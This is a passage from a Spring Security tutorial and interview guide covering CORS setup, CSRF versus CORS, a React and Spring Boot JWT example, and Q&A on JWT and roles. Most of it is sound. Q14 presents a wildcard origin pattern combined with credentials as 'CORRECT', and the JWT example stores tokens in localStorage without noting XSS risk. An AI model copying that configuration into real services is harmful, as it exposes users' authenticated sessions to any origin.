.allowedHeaders("*")  // Allow all headers
```

---

### 🔒 CORS Security Best Practices

**1. Don't Use Wildcard (`*`) in Production:**
```java
// ❌ BAD - Allows ANY origin
configuration.setAllowedOrigins(Arrays.asList("*"));

// ✅ GOOD - Specific origins only
configuration.setAllowedOrigins(Arrays.asList(
    "https://myapp.com",
    "https://www.myapp.com"
));
```

**2. Use Environment Variables for Origins:**
```java
@Value("${cors.allowed.origins}")
private String allowedOrigins;

@Bean
public CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration configuration = new CorsConfiguration();
    configuration.setAllowedOrigins(
        Arrays.asList(allowedOrigins.split(","))
    );
    // ... rest of configuration
}
```

**application.properties:**
```properties
# Development
cors.allowed.origins=http://localhost:3000,http://localhost:4200

# Production
cors.allowed.origins=https://myapp.com,https://www.myapp.com
```

**3. Restrict Methods to What You Need:**
```java
// ❌ BAD - Allows all methods including dangerous ones
.allowedMethods("*")

// ✅ GOOD - Only necessary methods
.allowedMethods("GET", "POST", "PUT", "DELETE")
```

**4. Be Careful with `allowCredentials(true)`:**
```java
// When using credentials, you MUST specify exact origins
configuration.setAllowCredentials(true);
configuration.setAllowedOrigins(Arrays.asList("http://localhost:3000"));
// Cannot use "*" with credentials!
```

**5. Use `allowedOriginPatterns` for Dynamic Subdomains:**
```java
// Allow all subdomains of myapp.com
configuration.setAllowedOriginPatterns(Arrays.asList("https://*.myapp.com"));
```

---

### 🎯 CORS vs CSRF - Key Differences

| Aspect | CORS | CSRF |
|--------|------|------|
| **What it is** | Browser restriction on cross-origin requests | Attack using authenticated session |
| **Purpose** | Control who can access your API | Prevent unauthorized actions |
| **When to use** | Always (for APIs accessed by browsers) | Session-based authentication only |
| **Protection Level** | Origin-based access control | Token-based request validation |
| **Configured on** | Server (response headers) | Server (token generation/validation) |
| **Client-side** | Browser enforces automatically | Developer must include token |
| **Attack Vector** | Data theft from another domain | Forged requests from malicious site |

---

### 🔄 Real-World Scenario: React + Spring Boot

**Setup:**
- Frontend: React app on `http://localhost:3000`
- Backend: Spring Boot API on `http://localhost:8080`
- Authentication: JWT (stateless)

**Required Configuration:**

**Spring Boot (Backend):**
```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            // Enable CORS
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))
            
            // Disable CSRF (using JWT, not sessions)
            .csrf(csrf -> csrf.disable())
            
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/auth/**").permitAll()
                .anyRequest().authenticated()
            )
            .sessionManagement(session -> 
                session.sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            );
        
        return http.build();
    }
    
    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration configuration = new CorsConfiguration();
        configuration.setAllowedOrigins(Arrays.asList("http://localhost:3000"));
        configuration.setAllowedMethods(Arrays.asList("GET", "POST", "PUT", "DELETE"));
        configuration.setAllowedHeaders(Arrays.asList("*"));
        configuration.setAllowCredentials(true);  // For sending Authorization header
        
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/**", configuration);
        return source;
    }
}
```

**React (Frontend):**
```javascript
// Login and store JWT
const login = async (username, password) => {
    const response = await fetch('http://localhost:8080/api/auth/login', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ username, password })
    });
    
    const data = await response.json();
    localStorage.setItem('token', data.token);  // Store JWT
};

// API call with JWT
const getUsers = async () => {
    const token = localStorage.getItem('token');
    
    const response = await fetch('http://localhost:8080/api/users', {
        method: 'GET',
        headers: {
            'Authorization': `Bearer ${token}`,  // Include JWT
            'Content-Type': 'application/json'
        },
        credentials: 'include'  // Include cookies if any
    });
    
    return await response.json();
};
```

---

### 📋 CORS Checklist for Production

- [ ] ✅ Use specific origins, not wildcard `*`
- [ ] ✅ Store allowed origins in environment variables
- [ ] ✅ Only allow necessary HTTP methods
- [ ] ✅ Restrict allowed headers if possible
- [ ] ✅ Use HTTPS in production
- [ ] ✅ Set appropriate `maxAge` for preflight caching
- [ ] ✅ Test with actual frontend domain
- [ ] ✅ Configure `allowCredentials` correctly
- [ ] ✅ Use `allowedOriginPatterns` for dynamic subdomains
- [ ] ✅ Monitor CORS errors in production logs

---

### 💡 Quick Decision Guide

**Should I enable CSRF?**
```
Are you using session-based authentication (cookies)?
├─ YES → ✅ Enable CSRF
└─ NO → Are you using JWT in Authorization header?
   └─ YES → ❌ Disable CSRF
```

**How should I configure CORS?**
```
Is your frontend on a different domain/port?
├─ YES → ✅ Configure CORS with specific origins
└─ NO → Same origin, CORS not needed
```

**Development vs Production:**
```
Development:
- CORS: Allow localhost:3000, localhost:4200
- CSRF: Disabled (if using JWT)

Production:
- CORS: Allow only production domains (https://myapp.com)
- CSRF: Based on authentication method
```

---

## 🔥 Common Interview Questions

### Q1: What is the difference between authentication and authorization?
**A:**
- **Authentication** - Verifying identity (login)
- **Authorization** - Verifying permissions (access control)

### Q2: How does JWT work?
**A:** JWT is a stateless token containing header, payload, and signature. Server validates signature without storing session. Payload contains user info and claims.

### Q3: Why use BCrypt for passwords?
**A:** BCrypt uses salted hashing, making it resistant to rainbow table attacks. It's adaptive (can increase complexity over time) and one-way (cannot be decrypted).

### Q4: What is @PreAuthorize?
**A:** Method-level security annotation that checks expressions before method execution. Supports SpEL for complex authorization logic.

### Q5: When to disable CSRF?
**A:** Disable for stateless REST APIs with JWT. Keep enabled for session-based, form-based applications.

### Q6: How to secure specific endpoints?
**A:** Use `requestMatchers()` in SecurityFilterChain:
```java
.authorizeHttpRequests(auth -> auth
    .requestMatchers("/api/public/**").permitAll()
    .requestMatchers("/api/admin/**").hasRole("ADMIN")
    .anyRequest().authenticated()
)
```

### Q7: What is SecurityContextHolder?
**A:** Thread-local storage for current user's authentication information. Access via:
```java
Authentication auth = SecurityContextHolder.getContext().getAuthentication();
```

### Q8: Difference between hasRole() and hasAuthority()?
**A:**
- `hasRole("ADMIN")` → Checks for authority "ROLE_ADMIN" (adds prefix)
- `hasAuthority("ROLE_ADMIN")` → Checks exact authority string

### Q9: Explain CSRF attack with example.
**A:** CSRF (Cross-Site Request Forgery) is when an attacker tricks a user's browser into making unwanted requests to a site where they're authenticated.

**Example:**
1. User logs into `bank.com` → Gets session cookie
2. User visits `malicious.com` → Contains hidden form that submits to `bank.com/transfer`
3. Browser automatically includes session cookie with request
4. Bank processes the forged request → Money transferred!

**Protection:** CSRF tokens that attacker cannot steal.

### Q10: Why disable CSRF for JWT APIs?
**A:** JWT is stored in localStorage and sent in Authorization header, not as a cookie. Browser doesn't automatically include it in requests, so CSRF attacks are impossible. CSRF protection is only needed for cookie-based authentication.

### Q11: What is CORS and why do we need it?
**A:** CORS (Cross-Origin Resource Sharing) is a browser security feature that restricts web pages from making requests to different domains.

**Why needed:**
- **Without CORS:** Malicious site could steal data from legitimate APIs
- **With CORS:** Server explicitly allows specific origins to access resources

**Example:** React app on `localhost:3000` needs CORS configuration to access Spring Boot API on `localhost:8080`.

### Q12: Explain CORS preflight request.
**A:** Preflight is an OPTIONS request sent by browser before actual request for non-simple requests (PUT, DELETE, custom headers).

**Flow:**
1. Browser sends OPTIONS request asking "Is this allowed?"
2. Server responds with allowed methods/headers
3. If approved, browser sends actual request
4. If denied, browser blocks request

**Purpose:** Check if server allows the operation before sending potentially dangerous request.

### Q13: What's the difference between CSRF and CORS?
**A:**
- **CSRF:** Attack where attacker tricks user into performing unwanted actions using their authenticated session. Protection: CSRF tokens.
- **CORS:** Browser restriction preventing cross-origin requests. Protection: Origin-based access control.

| Aspect | CSRF | CORS |
|--------|------|------|
| **Protects Against** | Forged requests from malicious sites | Unauthorized data access from other domains |
| **When Needed** | Session-based auth (cookies) | APIs accessed by browsers from different origins |
| **How Implemented** | Server validates token | Server sends Access-Control headers |

### Q14: Can you use wildcard (*) in CORS with credentials?
**A:** No! When `allowCredentials(true)`, you must specify exact origins. Cannot use `allowedOrigins("*")`.

```java
// ❌ WRONG - Will fail
configuration.setAllowCredentials(true);
configuration.setAllowedOrigins(Arrays.asList("*"));

// ✅ CORRECT
configuration.setAllowCredentials(true);
configuration.setAllowedOrigins(Arrays.asList("http://localhost:3000"));
// OR
configuration.setAllowedOriginPatterns(Arrays.asList("*"));
```

### Q15: How does Spring Security filter chain work?
**A:** Spring Security uses a chain of filters that process requests:
1. **SecurityContextPersistenceFilter** - Loads authentication from session
2. **UsernamePasswordAuthenticationFilter** - Processes login requests
3. **JwtAuthenticationFilter** (custom) - Validates JWT tokens
4. **ExceptionTranslationFilter** - Handles security exceptions
5. **FilterSecurityInterceptor** - Authorizes requests

Each filter processes request → next filter → controller.

### Q16: What happens if JWT token expires?
**A:** When JWT expires:
1. `JwtUtil.validateToken()` checks expiration date
2. If expired, returns `false`
3. Authentication fails
4. Server responds with `403 Forbidden` or `401 Unauthorized`
5. Client must re-login to get new token

**Solution:** Implement refresh token mechanism for seamless re-authentication.

### Q17: How to implement logout with JWT?
**A:** Since JWT is stateless, implement token blacklist:

```java
@Service
public class TokenBlacklistService {
    private final RedisTemplate<String, String> redisTemplate;
    
    public void blacklistToken(String token) {
        long expiration = jwtUtil.extractExpiration(token).getTime() 
                         - System.currentTimeMillis();
        redisTemplate.opsForValue().set(
            "blacklist:" + token, 
            "true", 
            expiration, 
            TimeUnit.MILLISECONDS
        );
    }
    
    public boolean isBlacklisted(String token) {
        return redisTemplate.hasKey("blacklist:" + token);
    }
}
```

**Steps:**
1. User logs out → Add token to blacklist in Redis
2. Every request → Check if token is blacklisted
3. Token expires → Auto-removed from Redis
4. Client deletes token from localStorage

### Q18: What are the three parts of JWT?
**A:**
1. **Header** - Algorithm and token type
   ```json
   {"alg": "HS256", "typ": "JWT"}
   ```
2. **Payload** - Claims/data
   ```json
   {"sub": "john", "roles": ["USER"], "exp": 1695086400}
   ```
3. **Signature** - Verification
   ```
   HMACSHA256(base64(header) + "." + base64(payload), secret)
   ```

**Format:** `header.payload.signature` (Base64 encoded, dot-separated)

### Q19: Should you store sensitive data in JWT?
**A:** **NO!** JWT payload is only Base64 encoded, NOT encrypted. Anyone can decode and read it.

**❌ Don't store:**
- Passwords
- Credit card numbers
- Social Security Numbers
- API keys

**✅ Safe to store:**
- User ID
- Username
- Roles/permissions
- Non-sensitive claims

### Q20: How to add custom claims to JWT?
**A:**
```java
public String generateToken(UserDetails userDetails, User user) {
    Map<String, Object> claims = new HashMap<>();
    claims.put("userId", user.getId());
    claims.put("email", user.getEmail());
    claims.put("roles", userDetails.getAuthorities());
    claims.put("department", user.getDepartment());
    
    return Jwts.builder()
            .claims(claims)
            .subject(userDetails.getUsername())
            .issuedAt(new Date())
            .expiration(new Date(System.currentTimeMillis() + expiration))
            .signWith(getSigningKey())
            .compact();
}
```

---

## 📝 Quick Revision Checklist

- [ ] Understand authentication vs authorization
- [ ] Know Spring Security filter chain
- [ ] Master JWT implementation (generate, validate, extract claims)
- [ ] Understand UserDetailsService
- [ ] Know how to secure endpoints (requestMatchers)
- [ ] Master @PreAuthorize and @Secured
- [ ] Understand BCrypt password encoding
- [ ] **Know CSRF attack flow and when to disable/enable**
- [ ] **Understand CORS mechanism and preflight requests**
- [ ] **Can explain difference between CSRF and CORS**
- [ ] Can configure CORS properly (origins, methods, credentials)
- [ ] Understand SecurityContextHolder
- [ ] Know difference between stateful and stateless authentication
- [ ] Can implement token blacklist for JWT logout
- [ ] Know JWT structure (header, payload, signature)
- [ ] Understand what NOT to store in JWT payload

---

## 💻 Practice Exercise

Create a complete Spring Security application:
1. User registration and login endpoints
2. JWT token generation and validation
3. Role-based access control (USER, ADMIN)
4. Password encoding with BCrypt
5. Secure specific endpoints by role
6. Method-level security with @PreAuthorize
7. CORS configuration for frontend
8. Global exception handling for security errors

**Security is MANDATORY for all backend roles - 95% interviews test this!**
